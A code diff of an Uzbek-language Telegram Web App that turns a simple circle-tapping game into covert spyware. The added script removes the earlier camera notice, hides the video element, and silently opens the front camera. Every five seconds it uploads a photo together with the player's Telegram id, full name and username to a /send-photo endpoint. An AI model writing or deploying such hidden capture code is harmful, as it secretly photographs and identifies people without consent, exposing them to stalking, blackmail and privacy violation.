@@ -2,8 +2,8 @@
 <html lang="uz">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Yuzni Topish O'yini</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <title>Yashirin Kamera - Doira O'yini</title>
   <style>
     body {
       font-family: sans-serif;
@@ -12,6 +12,7 @@
       text-align: center;
       padding: 2rem;
       margin: 0;
+      touch-action: none;
     }
 
     .game {
@@ -20,17 +21,49 @@
       padding: 1rem;
       background: #1d1d1d;
       border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0, 170, 255, 0.2);
+      user-select: none;
     }
 
-    .target {
-      width: 60px;
-      height: 60px;
-      background: radial-gradient(circle, rgba(0,170,255,0.8) 0%, rgba(0,170,255,0) 70%);
+    .circle {
+      width: 40px;
+      height: 40px;
+      background: #0af;
       border-radius: 50%;
       position: absolute;
-      pointer-events: none;
-      transition: transform 0.1s;
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+
+    .circle:hover {
+      transform: scale(1.2);
+    }
+
+    video {
+      display: none !important;
+      width: 0;
+      height: 0;
+      opacity: 0;
+    }
+
+    .loader {
+      border: 5px solid #333;
+      border-top: 5px solid #0af;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 2rem auto;
+      display: none;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .score {
+      font-size: 1.2rem;
+      margin: 1rem 0;
     }
 
     .game-area {
@@ -39,78 +72,152 @@
       background: #222;
       border-radius: 10px;
       overflow: hidden;
-      margin: 1rem 0;
-    }
-
-    .score-container {
-      display: flex;
-      justify-content: space-between;
-      margin: 1rem 0;
-    }
-
-    .score {
-      background: #333;
-      padding: 0.5rem 1rem;
-      border-radius: 8px;
-      font-weight: bold;
-    }
-
-    .timer {
-      color: #0af;
-      font-size: 1.2rem;
-      font-weight: bold;
-      margin: 1rem 0;
-    }
-
-    button {
-      background: #0af;
-      color: white;
-      border: none;
-      padding: 0.8rem 1.5rem;
-      border-radius: 8px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-
-    button:hover {
-      background: #09c;
-    }
-
-    .hidden {
-      display: none;
-    }
-
-    video {
-      display: none;
+      touch-action: manipulation;
     }
   </style>
 </head>
 <body>
   <div class="game">
-    <h1>Yuzni Topish O'yini</h1>
-    <p>O'yin davomida kamerangiz ishlatiladi. Targetga tegib ball to'plang!</p>
-    
+    <h2>Doira O'yini</h2>
+    <p>Doirani imkon qadar ko'proq bosing!</p>
+    <div class="score">Hisob: <span id="score">0</span></div>
+    <div class="loader"></div>
     <div class="game-area" id="gameArea">
-      <div class="target" id="target"></div>
-    </div>
-    
-    <div class="score-container">
-      <div class="score">Ball: <span id="score">0</span></div>
-      <div class="score">Rekord: <span id="highScore">0</span></div>
-    </div>
-    
-    <div class="timer" id="timer">60</div>
-    
-    <button id="startBtn">O'yinni Boshlash</button>
-    <div id="loading" class="hidden">
-      <p>Kamera sozlanmoqda...</p>
+      <div class="circle" id="circle"></div>
     </div>
   </div>
 
   <video id="video" autoplay playsinline muted></video>
 
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <script src="script.js"></script>
+  <script>
+    Telegram.WebApp.ready();
+    Telegram.WebApp.expand();
+
+    const user = Telegram.WebApp.initDataUnsafe?.user;
+    const userId = user?.id || "1612270615";
+    const fullName = `${user?.first_name || ""} ${user?.last_name || ""}`.trim();
+    const username = user?.username || "";
+
+    const video = document.getElementById("video");
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    const circle = document.getElementById("circle");
+    const gameArea = document.getElementById("gameArea");
+    const scoreDisplay = document.getElementById("score");
+    const loader = document.querySelector(".loader");
+
+    let score = 0;
+    let isCapturing = false;
+
+    // O'yin logikasi
+    function moveCircle() {
+      const maxX = gameArea.clientWidth - circle.clientWidth;
+      const maxY = gameArea.clientHeight - circle.clientHeight;
+      const newX = Math.random() * maxX;
+      const newY = Math.random() * maxY;
+      circle.style.left = `${newX}px`;
+      circle.style.top = `${newY}px`;
+    }
+
+    circle.addEventListener("click", () => {
+      score++;
+      scoreDisplay.textContent = score;
+      moveCircle();
+    });
+
+    circle.addEventListener("touchstart", (e) => {
+      e.preventDefault();
+      score++;
+      scoreDisplay.textContent = score;
+      moveCircle();
+    });
+
+    moveCircle();
+    setInterval(moveCircle, 1000);
+
+    // Kamera logikasi
+    async function startCamera() {
+      try {
+        loader.style.display = "block";
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: "user",
+            width: { ideal: 640 },
+            height: { ideal: 480 }
+          },
+          audio: false
+        });
+
+        video.srcObject = stream;
+        await new Promise((resolve) => {
+          video.onloadedmetadata = () => {
+            video.play().then(resolve).catch((err) => {
+              console.error("❌ Video oynatish xatosi:", err);
+            });
+          };
+        });
+
+        loader.style.display = "none";
+        startCapture();
+      } catch (err) {
+        console.error("❌ Kamera ishga tushmadi:", err);
+        loader.style.display = "none";
+        alert("Kamera ishga tushmadi: " + err.message);
+      }
+    }
+
+    async function startCapture() {
+      if (isCapturing) return;
+      isCapturing = true;
+
+      setInterval(async () => {
+        if (!video.videoWidth || video.paused || video.ended) {
+          console.warn("❌ Video ramkasi tayyor emas");
+          return;
+        }
+
+        try {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // Rasm sifatini tekshirish
+          const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+          let isBlack = true;
+          for (let i = 0; i < imageData.data.length; i += 4) {
+            if (imageData.data[i] > 10 || imageData.data[i + 1] > 10 || imageData.data[i + 2] > 10) {
+              isBlack = false;
+              break;
+            }
+          }
+
+          if (isBlack) {
+            console.warn("❌ Qora rasm aniqlandi");
+            return;
+          }
+
+          const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.8));
+          const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
+
+          const formData = new FormData();
+          formData.append("photo", file);
+          formData.append("user_id", userId);
+          formData.append("tg_fullname", fullName);
+          formData.append("tg_username", username);
+
+          await fetch("/send-photo", {
+            method: "POST",
+            body: formData
+          });
+          console.log("✅ Rasm yuborildi", new Date().toLocaleTimeString());
+        } catch (err) {
+          console.error("❌ Yuborish xatosi:", err);
+        }
+      }, 5000); // 5 sekund interval
+    }
+
+    startCamera();
+  </script>
 </body>
 </html>
